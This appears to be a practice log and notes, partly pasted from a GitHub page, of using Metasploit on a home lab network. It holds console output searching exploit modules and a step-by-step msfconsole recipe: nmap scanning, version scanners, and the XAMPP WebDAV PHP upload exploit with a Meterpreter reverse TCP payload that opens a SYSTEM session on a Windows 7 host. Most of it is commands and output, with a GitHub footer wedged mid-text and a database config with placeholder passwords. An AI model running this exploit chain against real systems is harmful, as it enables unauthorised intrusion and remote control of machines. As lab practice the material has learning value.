   23  exploit/multi/http/git_client_command_exec          2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   24  exploit/multi/http/maracms_upload_exec              2020-08-31       excellent  Yes    MaraCMS Arbitrary PHP File Upload
   25  exploit/windows/mssql/mssql_payload_sqli            2000-05-30       excellent  No     Microsoft SQL Server Payload Execution via SQL Injection
   26  auxiliary/scanner/scada/moxa_discover                                normal     No     Moxa UDP Device Discovery
   27  auxiliary/gather/nis_ypserv_map                                      normal     No     NIS ypserv Map Dumper
   28  auxiliary/server/dns/native_server                                   normal     No     Native DNS Server (Example)
   29  auxiliary/spoof/dns/native_spoofer                                   normal     No     Native DNS Spoofer (Example)
   30  auxiliary/server/ldap                                                normal     No     Native LDAP Server (Example)
   31  auxiliary/server/netbios_spoof_nat                  2016-06-14       normal     No     NetBIOS Response "BadTunnel" Brute Force Spoof (NAT Tunnel)
   32  auxiliary/admin/netbios/netbios_spoof                                normal     No     NetBIOS Response Brute Force Spoof (Direct)
   33  post/osx/gather/enum_adium                                           normal     No     OS X Gather Adium Enumeration
   34  post/osx/gather/enum_colloquy                                        normal     No     OS X Gather Colloquy Enumeration
   35  auxiliary/scanner/http/owa_ews_login                                 normal     No     OWA Exchange Web Services (EWS) Login Scanner
   36  exploit/multi/http/oracle_reports_rce               2014-01-15       great      Yes    Oracle Forms and Reports Remote Code Execution
   37  exploit/windows/email/ms10_045_outlook_ref_only     2010-06-01       excellent  No     Outlook ATTACH_BY_REF_ONLY File Execution
   38  exploit/windows/email/ms10_045_outlook_ref_resolve  2010-06-01       excellent  No     Outlook ATTACH_BY_REF_RESOLVE File Execution
   39  exploit/windows/mysql/scrutinizer_upload_exec       2012-07-27       excellent  Yes    Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential
   40  exploit/unix/smtp/qmail_bash_env_exec               2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
   41  exploit/linux/redis/redis_debian_sandbox_escape     2022-02-18       excellent  Yes    Redis Lua Sandbox Escape
   42  encoder/x86/service                                                  manual     No     Register Service
   43  exploit/multi/http/rails_dynamic_render_code_exec   2016-10-16       excellent  Yes    Ruby on Rails Dynamic Render File Upload Remote Code Execution
   44  auxiliary/admin/dcerpc/samr_computer                                 normal     No     SAMR Computer Management
   45  auxiliary/admin/smb/check_dir_file                                   normal     No     SMB Scanner Check File/Directory Utility
   46  exploit/linux/local/service_persistence             1983-01-01       excellent  No     Service Persistence
   47  auxiliary/scanner/http/squid_pivot_scanning                          normal     No     Squid Proxy Port Scanner
   48  exploit/solaris/sunrpc/sadmind_adm_build_path       2008-10-14       great      No     Sun Solaris sadmind adm_build_path() Buffer Overflow
   49  auxiliary/voip/telisca_ips_lock_control             2015-12-17       normal     No     Telisca IPS Lock Cisco IP Phone Control
   50  exploit/unix/webapp/tikiwiki_upload_exec            2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   51  auxiliary/admin/misc/wol                                             normal     No     UDP Wake-On-Lan (WOL)
   52  auxiliary/scanner/smb/impacket/wmiexec              2018-03-19       normal     No     WMI Exec
   53  post/windows/gather/enum_ad_managedby_groups                         normal     No     Windows Gather Active Directory Managed Groups
   54  post/windows/gather/enum_services                                    normal     No     Windows Gather Service Info Enumeration
   55  auxiliary/gather/windows_secrets_dump                                normal     No     Windows Secrets Dump
   56  exploit/windows/local/unquoted_service_path         2001-10-25       excellent  Yes    Windows Unquoted Service Path Privilege Escalation
   57  exploit/multi/http/wp_file_manager_rce              2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   58  exploit/windows/http/xampp_webdav_upload_php        2012-01-14       excellent  No     XAMPP WebDAV PHP Upload
   59  exploit/windows/http/zentao_pro_rce                 2020-06-20       excellent  Yes    ZenTao Pro 8.8.2 Remote Code Execution
Interact with a module by name or index. For example info 59, use 59 or use exploit/windows/http/zentao_pro_rce
msf6 auxiliary(scanner/smb/smb_version) > search xampp
Matching Modules
================
   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/atutor_upload_traversal    2019-05-17       excellent  Yes    ATutor 2.2.4 - Directory Traversal / Remote Code Execution,
   1  exploit/multi/http/maracms_upload_exec        2020-08-31       excellent  Yes    MaraCMS Arbitrary PHP File Upload
   2  exploit/windows/http/xampp_webdav_upload_php  2012-01-14       excellent  No     XAMPP WebDAV PHP Upload
   3  exploit/windows/http/zentao_pro_rce           2020-06-20       excellent  Yes    ZenTao Pro 8.8.2 Remote Code Execution
Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/zentao_pro_rce
msf6 auxiliary(scanner/smb/smb_version) > use exploit/windows/http/xampp_webdav_upload_php    
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(windows/http/xampp_webdav_upload_php) > set rhost 192.168.0.93
[-] Unknown datastore option: rhost. Did you mean LHOST?
msf6 exploit(windows/http/xampp_webdav_upload_php) > Interrupt: use the 'exit' command to quit
msf6 exploit(windows/http/xampp_webdav_upload_php) > options
Module options (exploit/windows/http/xampp_webdav_upload_php):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   no        The filename to give the payload. (Leave Blank for Random)
   PASSWORD  xampp            yes       The HTTP password to specify for authentication
   PATH      /webdav/         yes       The path to attempt to upload
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi
                                        t
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  wampp            yes       The HTTP username to specify for authentication
   VHOST                      no        HTTP server virtual host
Payload options (php/meterpreter/reverse_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.99     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Automatic
msf6 exploit(windows/http/xampp_webdav_upload_php) > set rhosts 192.168.0.93
rhosts => 192.168.0.93
msf6 exploit(windows/http/xampp_webdav_upload_php) > show payloads
Compatible Payloads
===================
   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/generic/custom                                       normal  No     Custom Payload
   1   payload/generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
   2   payload/generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
   3   payload/generic/ssh/interact                                 normal  No     Interact with Established SSH Connection
   4   payload/multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   5   payload/multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
   6   payload/php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
   7   payload/php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
   8   payload/php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
   9   payload/php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
   10  payload/php/download_exec                                    normal  No     PHP Executable Download and Execute
   11  payload/php/exec                                             normal  No     PHP Execute Command
   12  payload/php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
   13  payload/php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
   14  payload/php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
   15  payload/php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
   16  payload/php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   17  payload/php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   18  payload/php/meterpreter_reverse_tcp                          normal  No     PHP Meterpreter, Reverse TCP Inline
   19  payload/php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
   20  payload/php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)
msf6 exploit(windows/http/xampp_webdav_upload_php) > set payload php/meterpreter/reverse_tcp 
payload => php/meterpreter/reverse_tcp
msf6 exploit(windows/http/xampp_webdav_upload_php) > options
Module options (exploit/windows/http/xampp_webdav_upload_php):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   no        The filename to give the payload. (Leave Blank for Random)
   PASSWORD  xampp            yes       The HTTP password to specify for authentication
   PATH      /webdav/         yes       The path to attempt to upload
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    192.168.0.93     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi
                                        t
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  wampp            yes       The HTTP username to specify for authentication
   VHOST                      no        HTTP server virtual host
Payload options (php/meterpreter/reverse_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.99     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Automatic
msf6 exploit(windows/http/xampp_webdav_upload_php) > exploit
[*] Started reverse TCP handler on 192.168.0.99:4444 
[*] Uploading Payload to /webdav/P3t74ok.php
[-] Failed to upload file!
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/xampp_webdav_upload_php) > show payloads 
Compatible Payloads
===================
   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/generic/custom                                       normal  No     Custom Payload
   1   payload/generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
   2   payload/generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
   3   payload/generic/ssh/interact                                 normal  No     Interact with Established SSH Connection
   4   payload/multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   5   payload/multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
   6   payload/php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
   7   payload/php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
   8   payload/php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
   9   payload/php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
   10  payload/php/download_exec                                    normal  No     PHP Executable Download and Execute
   11  payload/php/exec                                             normal  No     PHP Execute Command
   12  payload/php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
   13  payload/php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
   14  payload/php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
   15  payload/php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
   16  payload/php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   17  payload/php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   18  payload/php/meterpreter_reverse_tcp                          normal  No     PHP Meterpreter, Reverse TCP Inline
   19  payload/php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
   20  payload/php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)
msf6 exploit(windows/http/xampp_webdav_upload_php) > search microsoft-ds
[-] No results from search
msf6 exploit(windows/http/xampp_webdav_upload_php) > 
msf6 exploit(windows/http/xampp_webdav_upload_php) > set payload 
payload => php/meterpreter/reverse_tcp
msf6 exploit(windows/http/xampp_webdav_upload_php) > options
Module options (exploit/windows/http/xampp_webdav_upload_php):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   no        The filename to give the payload. (Leave Blank for Random)
   PASSWORD  xampp            yes       The HTTP password to specify for authentication
   PATH      /webdav/         yes       The path to attempt to upload
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    192.168.0.93     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi
                                        t
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  wampp            yes       The HTTP username to specify for authentication
   VHOST                      no        HTTP server virtual host
Payload options (php/meterpreter/reverse_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.99     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Automatic
msf6 exploit(windows/http/xampp_webdav_upload_php) > exploit
[*] Started reverse TCP handler on 192.168.0.99:4444 
[*] Uploading Payload to /webdav/wd16XyP.php
[-] Failed to upload file!
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/xampp_webdav_upload_php) > show payloads
Footer
© 2022 GitHub, Inc.
Footer navigation

    Terms
    Privacy
    Security
    Status
    Docs
    Contact GitHub
    Pricing
    API
    Training
    Blog
    About

You have unread notifications










$$$$$$$$$



apt update && apt upgrade -y
vim /etc/ssh/sshd_config
systemctl enable postgresql
systemctl start  postgresql
systemctl start sshd 
systemctl enable sshd 
systemctl restart systemd-resolved
service sshd start
service sshd restart


netstat -utplan|grep post
netstat -utplan|grep 22
wget https://anydesk.com/pt/downloads/thank-you?dv=deb_64
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
apt install ./google-chrome-stable_current_amd64.deb
apt install xbase-clients python3-psutil libgtkglext1 -y
dpkg -i anydesk_6.2.0-1_amd64.deb
dpkg -i chrome-remote-desktop_current_amd64.deb 

updatedb
apt autoremove
init 6

msfconsole
db_connect -y /usr/share/metasploit-framework/config/database.yml # Connected to the database specified in the YAML file
workspace -a msftests
db_nmap -F 192.168.0.1-255
hosts
services

use auxiliary/scanner/ssh/ssh_version
#options 
services -u -p 22 -R
setg threads 10
run


use auxiliary/scanner/http/http_version 
#options       
services -u -p 80 -R  
run


use auxiliary/scanner/smb/smb_version 
#options          
services -u -p 445 -R      
run


hosts
services -u
services 192.168.0.93
search xampp



use exploit/windows/http/xampp_webdav_upload_php       
options
set rhosts 192.168.0.93
show payloads      
set payload php/meterpreter/reverse_tcp  
options
set lhost 192.168.0.15

exploit
[*] Meterpreter session 1 opened (192.168.0.15:4444 -> 192.168.0.6:51211)

meterpreter > ps 
meterpreter > getuid 
    Server username: SYSTEM (0)    
    meterpreter > sysinfo          
    Computer    : WIN7-X86         
    OS          : Windows NT WIN7
success

######tranformar em cat eof para automatizar
vim /usr/share/metasploit-framework/config/database.yml            

development:
  adapter: postgresql
  database: msf
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5

production:
  adapter: postgresql
  database: msf
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5

test:
  adapter: postgresql
  database: msf_test
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5
